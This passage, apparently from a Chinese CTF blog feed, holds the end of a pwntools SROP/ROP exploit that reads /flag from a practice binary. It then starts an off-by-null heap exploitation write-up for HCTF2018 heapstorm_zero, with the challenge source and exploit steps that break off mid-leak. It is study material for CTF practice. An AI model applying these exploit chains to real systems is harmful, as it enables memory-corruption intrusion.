class="keyword">import</span> sys</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line"><span class="comment"># context.arch='i386'</span></span><br><span class="line"></span><br><span class="line">vn_pwn_babypwn_1=ELF(<span class="string">'./vn_pwn_babypwn_1'</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> context.arch == <span class="string">'amd64'</span>:</span><br><span class="line">    libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">elif</span> context.arch == <span class="string">'i386'</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        libc=ELF(<span class="string">"/lib/i386-linux-gnu/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        libc=ELF(<span class="string">"/lib32/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_sh</span><span class="params">(other_libc = null)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> libc</span><br><span class="line">    <span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">        <span class="keyword">if</span> other_libc <span class="keyword">is</span> <span class="keyword">not</span> null:</span><br><span class="line">            libc = ELF(<span class="string">"./"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line">        <span class="keyword">return</span> remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> process(<span class="string">"./vn_pwn_babypwn_1"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_address</span><span class="params">(sh,info=null,start_string=null,end_string=null,offset=null,int_mode=False)</span>:</span></span><br><span class="line">    sh.recvuntil(start_string)</span><br><span class="line">    <span class="keyword">if</span> int_mode :</span><br><span class="line">        return_address=int(sh.recvuntil(end_string).strip(end_string),<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">elif</span> context.arch == <span class="string">'amd64'</span>:</span><br><span class="line">        return_address=u64(sh.recvuntil(end_string).strip(end_string).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        return_address=u32(sh.recvuntil(end_string).strip(end_string).ljust(<span class="number">4</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    log.success(info+str(hex(return_address+offset)))</span><br><span class="line">    <span class="keyword">return</span> return_address+offset</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span><span class="params">(sh)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">'cat /flag'</span>)</span><br><span class="line">    <span class="keyword">return</span> sh.recvrepeat(<span class="number">0.3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_gdb</span><span class="params">(sh,stop=False)</span>:</span></span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    <span class="keyword">if</span> stop :</span><br><span class="line">        raw_input()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    sh = get_sh()</span><br><span class="line">    get_gdb(sh)</span><br><span class="line">    libc.address = get_address(sh,<span class="string">'The libc base address is '</span>,<span class="string">'Here is my gift: 0x'</span>,<span class="string">'\n'</span>,-libc.symbols[<span class="string">'puts'</span>],<span class="keyword">True</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'Please input magic message: '</span>)</span><br><span class="line">    fake_frame  = p64(<span class="number">0</span>) * <span class="number">12</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RDI = RAX</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RSI = RDI</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RBP</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RBX</span></span><br><span class="line">    fake_frame += p64(libc.address + <span class="number">0x3C6500</span> - <span class="number">0x10</span>)          <span class="comment"># RDX = RSI</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RAX</span></span><br><span class="line">    fake_frame += p64(<span class="number">0x100</span>)                                   <span class="comment"># RCX = RDX</span></span><br><span class="line">    fake_frame += p64(libc.address + <span class="number">0x3C6500</span>)                 <span class="comment"># RSP</span></span><br><span class="line">    fake_frame += p64(libc.symbols[<span class="string">'syscall'</span>])                 <span class="comment"># RIP</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># eflags</span></span><br><span class="line">    fake_frame += p64(<span class="number">0x33</span>)                                    <span class="comment"># cs : gs : fs</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>) * <span class="number">7</span></span><br><span class="line">    <span class="comment"># get_gdb(sh)</span></span><br><span class="line">    sh.send(fake_frame)</span><br><span class="line">    ROP_chain  = <span class="string">'/flag\x00\x00\x00'</span></span><br><span class="line">    ROP_chain += p64(<span class="number">0</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6500</span> - <span class="number">0x10</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'open'</span>])</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">3</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6700</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000001b92</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0x100</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'read'</span>])</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">1</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6700</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000001b92</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0x100</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'write'</span>])</span><br><span class="line">    <span class="comment">#raw_input('&gt;')</span></span><br><span class="line">    sh.send(ROP_chain)</span><br><span class="line">    <span class="keyword">print</span> sh.recv()</span><br></pre></td></tr></table></figure><p>参考文章  :</p><p><a href="https://ray-cp.github.io/archivers/srop-analysis" target="_blank" rel="noopener">https://ray-cp.github.io/archivers/srop-analysis</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;什么是SROP&quot;&gt;&lt;a href=&quot;#什么是SROP&quot; class=&quot;headerlink&quot; title=&quot;什么是SROP&quot;&gt;&lt;/a&gt;什么是SROP&lt;/h2&gt;&lt;p&gt;&lt;code&gt;SROP&lt;/code&gt; 全称&lt;code&gt;Sigreturn Oriented Progr
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>off-by-null</title>
    <link href="https://nocbtm.github.io/2020/02/28/off-by-null/"/>
    <id>https://nocbtm.github.io/2020/02/28/off-by-null/</id>
    <published>2020-02-28T08:47:12.000Z</published>
    <updated>2020-04-07T03:40:06.561Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>off by null 是一个比较有意思的技术 下面通过 hctf2018 的 heapstrom_zero 实战一波。</p><p>题目链接 <a href="https://github.com/veritas501/hctf2018" target="_blank" rel="noopener">https://github.com/veritas501/hctf2018</a></p><h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>直接拿源码分析，程序是一个比较简单的菜单程序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">int main(void)&#123;</span><br><span class="line">init();</span><br><span class="line">while(1)&#123;</span><br><span class="line">switch(menu_getinput())&#123;</span><br><span class="line">case 1:&#123;</span><br><span class="line">Allocate();</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">case 2:&#123;</span><br><span class="line">View();</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">case 3:&#123;</span><br><span class="line">Delete();</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">case 4:&#123;</span><br><span class="line">puts(&quot;Bye!&quot;);</span><br><span class="line">exit(0);</span><br><span class="line">&#125;</span><br><span class="line">default:&#123;</span><br><span class="line">puts(&quot;Invaild choice!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先初始化一些东西，比如随机 mmap 一块内存用来存放指针之类的。然后提供三个选项供用户选择。</p><h3 id="init"><a href="#init" class="headerlink" title="init"></a>init</h3><p>看看 init 函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">sum=<span class="number">0</span>;</span><br><span class="line">setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">setvbuf(<span class="built_in">stderr</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">int</span> fd = open(<span class="string">"/dev/urandom"</span>,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Open urandom error!!\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">void</span> * pageaddr;</span><br><span class="line"><span class="keyword">if</span>(read(fd,&amp;pageaddr,<span class="keyword">sizeof</span>(<span class="keyword">void</span> *)) == <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Read urandom error!!\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line">pageaddr = (<span class="keyword">void</span> *)(((<span class="keyword">size_t</span>)(pageaddr)&amp;~<span class="number">0xfff</span>)%<span class="number">0x133700000000</span>);</span><br><span class="line"><span class="comment">// 随机mmap 一块内存，存放程序分配的内存指针</span></span><br><span class="line">page = mmap(pageaddr,<span class="number">0x1000</span>,<span class="number">3</span>,<span class="number">34</span>,<span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(page != pageaddr)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"mmap error!!\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 随机生成秘钥，用于加密指针</span></span><br><span class="line"><span class="keyword">if</span>(read(fd,&amp;(page-&gt;xorkey),<span class="keyword">sizeof</span>(<span class="keyword">size_t</span>)) == <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Read urandom error!!\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x20</span>;i++)&#123;</span><br><span class="line">page-&gt;chunk[i]=(<span class="keyword">char</span> *)page-&gt;xorkey;</span><br><span class="line">&#125;</span><br><span class="line">bar();</span><br><span class="line">close(fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分配一块内存，然后生成一个随机秘钥，秘钥的作用是把程序分配的内存的指针异或加密一下。</p><h3 id="Allocate"><a href="#Allocate" class="headerlink" title="Allocate"></a>Allocate</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Allocate</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">if</span>(sum &gt; <span class="number">0x20</span>u)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Too many chunks!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Please input chunk size:"</span>);</span><br><span class="line"><span class="keyword">int</span> size = read_int();   </span><br><span class="line"><span class="comment">// size 最大为0x38</span></span><br><span class="line"><span class="keyword">if</span>(!check_chunksize(size))&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Invalid size!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> * p = (<span class="keyword">char</span> *)<span class="built_in">calloc</span>(size, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(!p)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Alloc error!!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Please input chunk content:"</span>);</span><br><span class="line"><span class="comment">// read_n 会向p[size]='\x00',所以有一字节的溢出，溢出的字节为'\x00'</span></span><br><span class="line">read_n(p, size);</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span> &amp;&amp; (<span class="keyword">size_t</span>)page-&gt;chunk[i]^page-&gt;xorkey; ++i )&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( i == <span class="number">32</span> )&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Too many chunks!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 指针xor加密存放</span></span><br><span class="line">page-&gt;chunk[i] = (<span class="keyword">char</span>*)((<span class="keyword">size_t</span>)p^page-&gt;xorkey);</span><br><span class="line">++sum;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Chunk index: %d\n"</span>,i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先让用户输入一个 size , 然后判断 size 最大只能为 0x38 ， 这意味着我们只能分配 fastbin 的 chunk. 分配好内存后，会读入数据到里面，这时候会有一个 \x00 字节的溢出。</p><h3 id="View"><a href="#View" class="headerlink" title="View"></a>View</h3><p>就是把指针解密出来，然后用 printf 打印内容。</p><h3 id="Delete"><a href="#Delete" class="headerlink" title="Delete"></a>Delete</h3><p>解密出指针，然后释放掉，同时把相关的项设置为初始状态。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Delete</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Please input chunk index: "</span>);</span><br><span class="line"><span class="keyword">int</span> idx = read_int();</span><br><span class="line"><span class="keyword">if</span> ( idx &lt; <span class="number">0</span> || idx &gt; <span class="number">31</span> )&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Invalid index!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">char</span> *p = (<span class="keyword">char</span>*)((<span class="keyword">size_t</span>)page-&gt;chunk[idx]^page-&gt;xorkey);</span><br><span class="line"><span class="keyword">if</span> ( p )</span><br><span class="line">&#123;</span><br><span class="line">--sum;</span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line">page-&gt;chunk[idx] = (<span class="keyword">char</span>*)(page-&gt;xorkey);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>总结一下程序的功能。</p><p>我们最多只能 malloc(0x38) 即 0x40 大小的 chunk.<br>有一个 打印 chunk 内容的函数。<br>分配时可以 off by null.</p><h2 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h2><h3 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h3><p>一字节溢出的利用围绕着的是 堆块在分配，释放，合并时对 chunk 的 size 域的信任关系。而如果只是 fastbin 的话 off by null 是没法利用的，因为只要溢出就会把 size 设置为 0.</p><p>这里有一个 tips , 使用 scanf 获取内容时，如果 输入字符串比较长会调用 malloc 来分配内存。</p><p>在 malloc 分配内存时，首先会一次扫描一遍 fastbin , smallbin ， unsorted bin ，largebin, 如果都找不到可以分配的 chunk 分配给用户 ， 会进入 top_chunk 分配的流程， 如果此时还有 fastbin ，就会触发堆合并机制，把 fastbin 合并 之后放入 smallbin，再看能否分配，不能的话会使用 top_chunk 进行分配。</p><p>于是利用 scanf 能分配大内存的特性，我们可以触发 堆合并，然后让 fastbin 合并成一个 smallbin , 然后在触发 off-by-null , 就是常规的利用思路了。</p><h3 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h3><p>首先分配 12 个 chunk, 其中 第一个 和最后一个保留， 第一个 chunk 用于 触发 off-by-null ， 最后一个用于防止在 堆合并时与 top_chunk 进行合并。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x38</span>, <span class="string">'a'</span>)  <span class="comment"># 0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">'a'</span>)  <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">'a'</span>)  <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">'a'</span>)  <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">'a'</span>)  <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 5</span></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">'x'</span>)  <span class="comment"># 6</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 7</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 8</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 9</span></span><br><span class="line">pay = <span class="string">'a'</span> * <span class="number">0x20</span> + p64(<span class="number">0x200</span>) + p64(<span class="number">0x20</span>)  <span class="comment"># shrink chunk 前，配置好</span></span><br><span class="line">add(<span class="number">0x38</span>, pay)  <span class="comment"># 10</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'end'</span>)  <span class="comment"># 11  , 保留块， 防止和 top chunk 合并</span></span><br></pre></td></tr></table></figure><p>然后把中间的 10 个 chunk 释放掉，同时触发 堆合并，构造一个 0x210 大小的 smallbin<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 释放掉 chunk</span><br><span class="line">for i in range(1, 11):</span><br><span class="line">    dele(i)</span><br><span class="line"></span><br><span class="line"># 利用 scanf 分配大内存 0x400+ , 会触发堆合并</span><br><span class="line"># fastbin 会合并进入 smallbin</span><br><span class="line">triger_consolidate()</span><br></pre></td></tr></table></figure></p><p>函数 triger_consolidate 的逻辑就是发送 0x400 的字符串给 scanf 处理，然后 scanf 会分配大内存，触发 堆合并。</p><p>此时的内存布局如下</p><p><img alt="" data-src="/imgs/off-by-null-1.png" class="lozad"></p><p>图中特殊标出的 0x200 | 0x20 用于保证后续利用过掉 check.</p><p>然后利用 chunk 0 , 溢出 一字节的 \x00 , 修改下面那个 smallbin 的 size —&gt; 0x200</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 利用 chunk 0 , 溢出 一字节的 \x00 , 修改 size ---&gt; 0x200</span></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">pay = <span class="string">'a'</span> * <span class="number">0x38</span></span><br><span class="line">add(<span class="number">0x38</span>, pay)  <span class="comment"># 0</span></span><br></pre></td></tr></table></figure><p>紧接着在这个剩下的 0x200 字节的 smallbin 里面分配 8 个 chunk , 然后利用同样的方法，在里面构造一个 smallbin</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x38</span>, <span class="string">'a'</span> * <span class="number">8</span>)  <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'b'</span> * <span class="number">8</span>)  <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'c'</span> * <span class="number">8</span>)  <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 5</span></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">'x'</span>)  <span class="comment"># 6</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 7</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用 大量的 fastbin + 堆合并 构造 smallbin , 大小 0xc0</span></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">triger_consolidate()</span><br></pre></td></tr></table></figure><p><img alt="" data-src="/imgs/off-by-null-2.png" class="lozad"></p><p>下面释放掉 chunk 11</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 触发 overlap</span></span><br><span class="line">dele(<span class="number">11</span>)</span><br><span class="line">triger_consolidate()</span><br></pre></td></tr></table></figure><p>系统发现 chunk 11 的 pre_size 为 0 ，即表明前一个 chunk 是释放状态，同时 chunk 11 和 top_chunk 相邻，所以 即使 chunk 11 的大小在 fastbin 的范围内也会触发合并操作，于是会通过 chunk 11 的 pre_size ( 0x210 ) 找到上面那个 smallbin 的起始地址。</p><p>然后对 smallbin 做 unlink 操作， 此时 smallbin 已经在链表上，所以 unlink 可以通过，拆下来后进行合并， 合并之后形成了一个大 chunk.<br><img alt="" data-src="/imgs/off-by-null-3.png" class="lozad"></p><p>这个 chunk 会继续和 top_chunk 合并变成 top_chunk 的一部分。注意到此时 chunk4 - chunk8 已经落入 top_chunk 里。</p><p>接下来通过类似的方法，分配多个 chunk ， 然后释放掉中间的一些的 chunk , 然后出发 堆合并，构造一个比较大的 smallbin<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">add(0x28, &apos;a&apos;)  # 1</span><br><span class="line">add(0x28, &apos;a&apos;)  # 2</span><br><span class="line">add(0x18, &apos;a&apos;)  # 3</span><br><span class="line">add(0x18, &apos;a&apos;)  # 9</span><br><span class="line">add(0x38, &apos;1&apos; * 0x30)  # 10</span><br><span class="line">add(0x38, &apos;2&apos; * 0x30)  # 11</span><br><span class="line">add(0x28, &apos;3&apos; * 0x30)  # 12</span><br><span class="line">add(0x38, &apos;4&apos; * 0x30)  # 13</span><br><span class="line">add(0x38, &apos;5&apos; * 0x30)  # 14</span><br><span class="line">pay = &apos;a&apos; * 0x20 + p64(0x200) + p64(0x20)</span><br><span class="line">add(0x38, pay)  # 15</span><br><span class="line"></span><br><span class="line">add(0x38, &apos;end&apos;)  # 16</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dele(1)</span><br><span class="line">dele(2)</span><br><span class="line">dele(3)</span><br><span class="line">for i in range(9, 16):</span><br><span class="line">    dele(i)</span><br><span class="line"></span><br><span class="line">triger_consolidate()</span><br></pre></td></tr></table></figure></p><p>此时的内存状态如图</p><p><img alt="" data-src="/imgs/off-by-null-4.png" class="lozad"></p><p>此时 chunk 4 - chunk 8 落入了新构造的 smallbin 里面。下面通过 不断的分配，会对这个 smallbin 进行切割，这个过程就会使得 一些链表用的指针落入到 还处于 使用状态的 chunk4 - chunk8 的某一个 chunk 里面， 然后利用 puts 功能，就可以打印指针的内容，造成信息泄露， 拿到 libc 的地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">### 构造好 unsorted bin ，下面通过不断切割，让指针落入 overlap chunk 里面， 然后 Puts leak 